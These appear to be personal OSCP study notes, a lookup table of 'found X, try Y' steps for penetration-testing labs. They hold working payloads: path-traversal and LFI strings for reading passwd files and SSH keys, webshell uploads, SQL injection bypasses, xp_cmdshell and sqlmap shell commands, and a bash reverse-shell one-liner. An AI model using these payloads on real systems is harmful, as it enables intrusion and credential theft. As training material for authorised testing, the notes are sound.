# OSCP Decision Tree

Quick "I found X, what do I try" lookup. Skim for whatever's in front of you right now, follow the link for the full walkthrough.

Covers Modules 6 through 9 so far. Will grow as later modules get added.

---

## Recon / Enumeration

### Found an open port, not sure what to do with it
→ Match it against the service-specific enumeration steps in [[METHODOLOGY CHEAT SHEET#Step 3: Service-Specific Enumeration]]
→ Full background on the scanning process itself: [[Information Gathering]] (Module 6)

### Ran Nessus or Nmap and it flagged a CVE
→ Search `<CVE-number> exploit` or `<CVE-number> nse` to find a known PoC before writing your own
→ See [[Vulnerability Scanning#7.3.2. Working with NSE Scripts|7.3.2]] for the search-and-adapt workflow
→ Nmap NSE quick scan: [[Vulnerability Scanning#7.3.1. NSE Vulnerability Scripts|7.3.1]]

### Nessus scan comes back with 0 hosts / 0 vulnerabilities
→ Don't touch scan config first. Check basic reachability:
```bash
ping -c 4 <target-ip>
ssh <user>@<target-ip>
```
→ If both fail, suspect the lab instance itself (may need reverting), not your scan settings
→ Full writeup: [[Vulnerability Scanning#7.2.5. Performing an Authenticated Vulnerability Scan|7.2.5 troubleshooting note]]

### Nessus Essentials says "license expired" or you've hit the 5-host cap
→ Get a fresh activation code from the Essentials "Register now" form, re-register with `nessuscli fetch --register`
→ Full steps: [[Vulnerability Scanning#7.2.1. Installing Nessus|7.2.1 troubleshooting box]]

---

## Web Applications

### Found a parameter whose value looks like a filename (`page=`, `file=`, `template=`, `lang=`, `doc=`)
→ This is the classic LFI/traversal shape. Test it:
```
?page=../../../../../../../../../etc/passwd
```
→ Nothing back or 404? Try URL-encoding the dots: `%2e%2e/` (or the asymmetric `.%2e/%2e%2e/...` form if the uniform one doesn't land)
→ See [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]] and [[Common Web Application Attacks#9.1.3. Encoding Special Characters|9.1.3]]

### Traversal confirmed, target is Linux
→ Read `/etc/passwd`, then hunt disclosed users' home directories for `.ssh/id_rsa`
→ If found, extract it mechanically (never copy/paste by hand, see the callout below) and try SSH
→ See [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]

### Traversal confirmed, target is Windows
→ No direct "read passwd, find key" path on Windows. Check IIS-specific locations instead: `C:\inetpub\wwwroot\web.config`, `C:\inetpub\logs\LogFiles\W3SVC1\`
→ Try both `../` and `..\`
→ See the Windows notes in [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]

### You have LFI and want code execution, not just file reads
→ Three options depending on what's available:
  1. **Log poisoning**: find a controllable field that lands in a log (User-Agent in `access.log` is the classic one), inject a PHP snippet via that field, then include the log. See [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]]
  2. **`data://` wrapper**: embed the payload directly in the URL, no write step needed, but requires `allow_url_include`. See [[Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]]
  3. **RFI**: host a webshell yourself and include it remotely, also requires `allow_url_include`. See [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3]]

### You have LFI and want to read PHP source (not execute it)
→ Use `php://filter/convert.base64-encode/resource=<file>`, then `base64 -d` the response
→ See [[Common Web Application Attacks#9.2.2. PHP Wrappers|9.2.2]]

### Found an upload form
→ Try uploading a webshell (`.php`) directly first
→ Blocked? Try a case-swapped extension (`.pHP`), or `.phps`/`.php7`, or upload as `.txt` then rename via the app's own rename feature
→ IIS/ASP.NET target instead of PHP? Same idea, `/usr/share/webshells/aspx/cmdasp.aspx`, upload via the browser (viewstate tokens are painful with curl)
→ Upload lands on a different port/path than where it's served from? Check the app's own text/behavior for clues about where uploads actually go
→ See [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] and [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1 case study 4]]

### Upload form works but nothing you upload ever executes
→ Check whether the `filename` field itself is traversal-able. If so, overwrite something like `authorized_keys` instead of relying on execution
→ See [[Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]]

### Found an input field that reflects your input back into the page
→ Test with `< > ' " { } ;` and see what survives unencoded
→ See [[Introduction to Web Application Attacks#8.4.3. Identifying XSS Vulnerabilities|8.4.3]]
→ Got a hit? Basic PoC and privesc-via-XSS walkthrough: [[Introduction to Web Application Attacks#8.4.4. Basic XSS|8.4.4]] and [[Introduction to Web Application Attacks#8.4.5. Privilege Escalation via XSS|8.4.5]]

### Found a form/field whose value looks like an OS command (a URL for `git clone`, a filename passed to some system tool, etc)
→ Try replacing the value entirely with a harmless command (`id`, `ipconfig`). Filtered? Confirm the expected command alone still works, then chain a second one with a URL-encoded `;` (`%3B`), `&&`, or (CMD) `&`
→ `git version` (or equivalent) output tells you Windows vs Linux in one shot
→ On Windows, use PetSerAl's one-liner to check CMD vs PowerShell before picking a reverse shell syntax
→ See [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]]

### Found a field with no obvious command hint (no `git clone`-style placeholder), but it feels off
→ Work through injection types systematically rather than guessing: try arithmetic (`1%2B1`, is it evaluated to `2`?), then template syntax (`{{7*7}}`, is it `49`?), then shell metacharacters (backticks, `$()`). Watch for **any change in behavior**, not just a direct hit, a response going blank instead of echoing your literal input is itself a signal something's being evaluated
→ See [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1 case study 3]] for the full walkthrough of this exact reasoning process

### A character in your payload disappears from the reflected response entirely (not HTML-escaped, just gone)
→ That's active filtering of that specific character, not passive echoing. Common culprit: `"` stripped while `'` survives. Switch quote style in your payload rather than assuming the whole injection point is dead

### Found a login form, search box, or any URL/POST parameter that likely touches a database
→ Test with a single `'` first. A SQL syntax error (rather than the app's normal error) confirms in-band injection
→ Login form? Try the classic auth bypass: `offsec' OR 1=1 -- //` in the username field
→ Results reflected on the page? Go UNION-based: find the column count with `' ORDER BY 1-- //` (increment until it errors), then `UNION SELECT` dummy values to see which columns render
→ Nothing reflected at all? Test boolean-based (`' AND 1=1 -- //`) and time-based (`' AND IF(1=1,sleep(3),'false') -- //`) blind SQLi instead
→ See [[SQL Injection Attacks#10.2. Manual SQL Exploitation|10.2]]

### Confirmed SQLi, want code execution
→ MySQL: write a webshell via `UNION SELECT ... INTO OUTFILE` to a writable web-servable path, then hit it with `?cmd=`
→ MSSQL: enable and use `xp_cmdshell` (`sp_configure` twice, then `EXECUTE xp_cmdshell '<command>'`)
→ Don't want to do it by hand? `sqlmap -r post.txt -p <param> --os-shell --web-root <path>` automates the MySQL path end to end
→ See [[SQL Injection Attacks#10.3. Manual and Automated Code Execution|10.3]]

### Found a REST API (or suspect one)
→ Brute force versioned paths (`gobuster` with a `{GOBUSTER}/v1` pattern file)
→ Probe with `curl`, watch for `405` vs `404` (405 means the path exists, wrong HTTP method)
→ Check for mass assignment (extra fields like `"admin":"True"` in a register/create request)
→ See [[Introduction to Web Application Attacks#8.3.3. Enumerating and Abusing APIs|8.3.3]]

---

## Shells & Payloads

### Got code execution, need a reverse shell
→ Linux target: `bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"`, URL-encode it if going through a web parameter
→ Windows target: PowerShell one-liner, base64-encode with Unicode first, deliver via `powershell -enc`
→ Always start the listener (`nc -nvlp <port>`) *before* triggering
→ See [[Common Web Application Attacks#9.2.1. Local File Inclusion (LFI)|9.2.1]] (Linux) and [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]] (Windows)
→ Generalized command reference: [[METHODOLOGY CHEAT SHEET#Step 2: Shells & Payloads]]

### Reverse shell landed
→ Immediately check `whoami` / `id` and `sudo -l` (Linux) or `whoami /priv` (Windows) before assuming you need to escalate. Web server processes on training VMs are often already root/SYSTEM

### `python3 -m http.server` isn't serving the file you expect (404s, or netcat never catches anything)
→ It serves whatever directory it was launched from. `cd` into the exact folder immediately before starting it, and check the server's own access log for a `200` before assuming the listener is broken
→ Full story: [[Common Web Application Attacks#9.2.3. Remote File Inclusion (RFI)|9.2.3 troubleshooting box]]

---

## Secrets & Credentials

### Retrieved a private key (or any multi-line secret) through a web vuln
→ Never copy/paste it by hand. Save the raw response to a file and extract with `sed`/`grep`:
```bash
curl -s "<vulnerable-url>" -o raw_response.txt
sed -n '/-----BEGIN.../,/-----END.../p' raw_response.txt > secret_file
```
→ Full reasoning: [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2]]

### SSH key fails to load with a vague "unsupported"/"can't parse this" error
→ Don't jump to OpenSSL-compatibility theories first. Re-extract the key mechanically (see above) and `diff` it against your original copy. Corruption from manual copy/paste is the more common cause
→ If two independent tools (e.g. `ssh-keygen` and `puttygen`) both reject the same file, that's the tell it's the file, not the library
→ Full story: [[Common Web Application Attacks#9.1.2. Identifying and Exploiting Directory Traversals|9.1.2 troubleshooting box]]

---

## General Patterns Worth Remembering

- **A filter blocking `../` isn't blocking traversal.** Encoding (`%2e%2e/`, base64, etc) is the standard way past a filter that only checks literal plaintext. Shows up in 9.1.3, 9.2.2, and 9.3.1, always the same underlying idea.
- **Automated tool flags a vuln → confirm it manually.** Nessus/Nmap NSE finding something isn't proof it's exploitable. `curl` the disclosed PoC yourself. See [[Vulnerability Scanning#7.4. Wrapping Up|7.4]].
- **Check privilege level the moment you land a shell.** Don't assume you need privesc, training VMs frequently run services as root/SYSTEM already.
- **When a module's exact demo payload doesn't reproduce**, check whether an earlier tool/scan already disclosed the actual working PoC pattern before just varying parameters blindly.
- **A request to a reused hostname comes back empty/silent.** Check `/etc/hosts` before assuming the vuln itself isn't working. If the same hostname (e.g. `mountaindesserts.local`) gets reused across multiple labs in a module, it's easy to leave it pointed at an earlier box's stale IP. `grep <hostname> /etc/hosts` and fix with `sed -i` if needed. See [[Common Web Application Attacks#9.3.2. Using Non-Executable Files|9.3.2]] for where this bit us.
- **A `curl -X POST --data` payload with `&`, `=`, or spaces fails or gets truncated for no obvious reason.** `--data` sends the value raw, so those characters get read as form-field separators by the server. Switch to `--data-urlencode`, which percent-encodes automatically. Bit us with a reverse shell one-liner containing `>&`/`0>&1` in [[Common Web Application Attacks#9.4.1. OS Command Injection|9.4.1]].
- **A lab question asks about specific code details (variable names, field names) and a module's generic example answer gets rejected.** The module's illustrative code snippet is often just an example, not a verbatim copy of the actual lab VM's source. Check the live app's real form field names (`curl` the page, or view source) instead of assuming the textbook variable names apply exactly. Bit us in [[SQL Injection Attacks#10.2.1. Identifying SQLi via Error-Based Payloads|10.2.1]] (`$uname` in the module vs. the actual `$uid`/`name="uid"` on the VM).
